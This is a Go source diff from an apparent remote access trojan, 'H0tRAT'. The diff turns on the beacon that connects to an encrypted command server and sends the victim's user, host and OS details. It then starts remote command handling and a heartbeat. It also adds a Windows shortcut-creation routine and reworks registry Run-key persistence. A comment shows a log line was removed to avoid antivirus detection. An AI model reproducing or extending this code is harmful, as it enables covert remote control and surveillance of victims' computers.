@@ -4,13 +4,14 @@ import (
 	"bufio"
 	"bytes"
 	"fmt"
+	"github.com/go-ole/go-ole"
+	"github.com/go-ole/go-ole/oleutil"
 	"github.com/go-vgo/robotgo"
-	"golang.org/x/sys/windows/registry"
 	"image/jpeg"
-	"log"
 	"net"
-	"os"
 	"path/filepath"
+	"runtime"
+	"strconv"
 	"sync"
 	"time"
 	"ylc/src/demo/util"
@@ -43,7 +44,7 @@ func heartbeat(conn net.Conn) {
 			connectNew()
 			return
 		}
-		fmt.Println("连接了==========")
+		//fmt.Println("连接了==========")这句话会报毒
 		time.Sleep(time.Second * 10)
 	}
 	wg.Done() // 协程计数器加-1
@@ -51,9 +52,11 @@ func heartbeat(conn net.Conn) {
 
 func connectNew() {
 	wg.Add(3) // 协程计数器 +1
+	//go AddToStartup()
+	//go AddToStartUpNew()
 	ipEncryptPath, err := util.EncryptString("ylcworld19990709", IP)
 	ipDecryptPath, err := util.DecryptString("ylcworld19990709", ipEncryptPath)
-	//go AddToStartup()
+
 	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", ipDecryptPath)
 
 	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
@@ -64,25 +67,26 @@ func connectNew() {
 	}
 	defer socket.Close()
 	//// IO流
-	//dataOutputStream := bufio.NewWriter(socket)
-	//
-	//// 发送信息
-	//fmt.Fprintln(dataOutputStream, "H0tRAT")
-	//fmt.Fprintln(dataOutputStream, "USER")
-	//fmt.Fprintln(dataOutputStream, "HOSTNAME")
-	//fmt.Fprintln(dataOutputStream, runtime.GOOS)
-	//fmt.Fprintln(dataOutputStream, IP)
-	//fmt.Fprintln(dataOutputStream, "测试地址")
-	//fmt.Fprintln(dataOutputStream, "测试名字")
-	//fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
-	//fmt.Fprintln(dataOutputStream, "测试")
-	//fmt.Fprintln(dataOutputStream, VERSION)
-	//fmt.Fprintln(dataOutputStream, "360")
-	//
-	//dataOutputStream.Flush()
-	////协程计数器加-1
-	//go doSomeThing(socket)
-	//go heartbeat(socket)
+	dataOutputStream := bufio.NewWriter(socket)
+
+	// 发送信息
+	fmt.Fprintln(dataOutputStream, "H0tRAT")
+	fmt.Fprintln(dataOutputStream, "USER")
+	fmt.Fprintln(dataOutputStream, "HOSTNAME")
+	fmt.Fprintln(dataOutputStream, runtime.GOOS)
+	fmt.Fprintln(dataOutputStream, IP)
+
+	fmt.Fprintln(dataOutputStream, "测试地址")
+	fmt.Fprintln(dataOutputStream, "测试名字")
+	fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
+	fmt.Fprintln(dataOutputStream, "测试")
+	fmt.Fprintln(dataOutputStream, VERSION)
+	fmt.Fprintln(dataOutputStream, "360")
+
+	dataOutputStream.Flush()
+	//协程计数器加-1
+	go doSomeThing(socket)
+	go heartbeat(socket)
 
 	wg.Wait() //等待协程计数器为0 退出
 	fmt.Println("abc========================")
@@ -164,32 +168,93 @@ func doSomeThing(socket net.Conn) {
 
 }
 
-func AddToStartup() {
-	//复制程序到指定目录
-	util.CopyToProgramData()
-	exePath := filepath.Join("C:\\ProgramData", filepath.Base(os.Args[0]))
-	exeName := filepath.Base(exePath)
+// 创建快捷方式
+func createShortcut(shortcutPath string, targetPath string) error {
+	ole.CoInitialize(0)
+	defer ole.CoUninitialize()
 
-	// 打开注册表项
-	key, err := registry.OpenKey(registry.CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
+	unknown, err := oleutil.CreateObject("WScript.Shell")
 	if err != nil {
-		log.Fatal(err)
+		return err
 	}
-	defer key.Close()
+	defer unknown.Release()
 
-	// 检查是否已存在该项
-	_, _, err = key.GetStringValue(exeName)
-	if err == nil {
-		// 如果已存在，则不需要重复写入
-		return
-	}
-	encryptPath, err := util.EncryptString("ylcworld19990709", exePath)
-
-	// 写入注册表项
-	decryptPath, err := util.DecryptString("ylcworld19990709", encryptPath)
-	err = key.SetExpandStringValue(exeName, decryptPath)
+	shell, err := unknown.QueryInterface(ole.IID_IDispatch)
 	if err != nil {
-		log.Fatal(err)
+		return err
 	}
-	wg.Done() // 协程计数器加-1
+	defer shell.Release()
+
+	_, err = oleutil.CallMethod(shell, "CreateShortcut", shortcutPath)
+	if err != nil {
+		return err
+	}
+
+	variantShortcut, err := oleutil.CallMethod(shell, "CreateShortcut", shortcutPath)
+	if err != nil {
+		return err
+	}
+	defer variantShortcut.Clear()
+
+	shortcut := variantShortcut.ToIDispatch()
+	if err != nil {
+		return err
+	}
+	defer shortcut.Release()
+
+	_, err = oleutil.PutProperty(shortcut, "TargetPath", targetPath)
+	if err != nil {
+		return err
+	}
+
+	_, err = oleutil.PutProperty(shortcut, "WorkingDirectory", filepath.Dir(targetPath))
+	if err != nil {
+		return err
+	}
+
+	_, err = oleutil.PutProperty(shortcut, "IconLocation", targetPath+",0")
+	if err != nil {
+		return err
+	}
+
+	_, err = oleutil.PutProperty(shortcut, "WindowStyle", 1) // 隐藏属性为7
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
+
+//func AddToStartup() {
+//	//复制程序到指定目录
+//	util.CopyToProgramData()
+//	exePath := filepath.Join("C:\\ProgramData", filepath.Base(os.Args[0]))
+//	exeName := filepath.Base(exePath)
+//
+//	// 打开注册表项
+//	key, err := registry.OpenKey(registry.CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
+//	if err != nil {
+//		log.Fatal(err)
+//	}
+//	defer key.Close()
+//
+//	// 检查是否已存在该项
+//	_, _, err = key.GetStringValue(exeName)
+//	if err == nil {
+//		// 如果已存在，则不需要重复写入
+//		return
+//	}
+//	encryptPath, err := util.EncryptString("ylcworld19990709", exePath)
+//
+//	// 写入注册表项
+//	decryptPath, err := util.DecryptString("ylcworld19990709", encryptPath)
+//	apiName := "key.SetExpandStringValue"
+//	args := []string{decryptPath}
+//
+//	err = util.CallAPI(apiName, args)
+//	err = key.SetExpandStringValue(exeName, decryptPath)
+//	if err != nil {
+//		log.Fatal(err)
+//	}
+//	wg.Done() // 协程计数器加-1
+//}
